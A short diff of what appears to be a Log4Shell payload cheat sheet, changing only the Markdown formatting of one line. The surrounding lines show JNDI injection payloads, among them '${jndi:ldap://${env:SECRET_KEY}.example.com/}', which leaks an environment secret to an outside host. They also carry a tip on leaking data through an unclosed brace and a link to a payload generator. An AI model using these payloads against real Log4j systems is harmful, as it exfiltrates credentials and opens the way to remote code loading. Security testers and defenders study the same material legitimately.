@@ -14,7 +14,7 @@ ${jndi:ldap://${env:SECRET_KEY}.example.com/}
 ```
 
 ## Omitting closing brace can lead to data exfil after "/" sign
-${jndi:ldap://example.com/
+`${jndi:ldap://example.com/`
 
 ## Payload generator
 https://github.com/woodpecker-appstore/log4j-payload-generator
